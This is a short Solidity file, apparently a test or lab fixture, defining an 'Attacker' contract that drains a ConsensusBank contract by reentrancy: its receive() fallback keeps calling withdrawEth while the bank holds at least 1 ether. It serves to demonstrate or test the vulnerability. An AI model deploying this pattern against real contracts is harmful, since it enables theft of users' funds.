// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "../src/ConsensusBank.sol";

contract Attacker {
    ConsensusBank consensusBank;

    constructor(address _consensusBank) {
        consensusBank = ConsensusBank(_consensusBank);
    }

    receive() external payable {
        if (address(consensusBank).balance >= 1 ether) {
            consensusBank.withdrawEth(1 ether);
        }
    }

    function attack() external payable { 
        consensusBank.depositEth{value: 1 ether}();
        consensusBank.withdrawEth(1 ether);
    }
}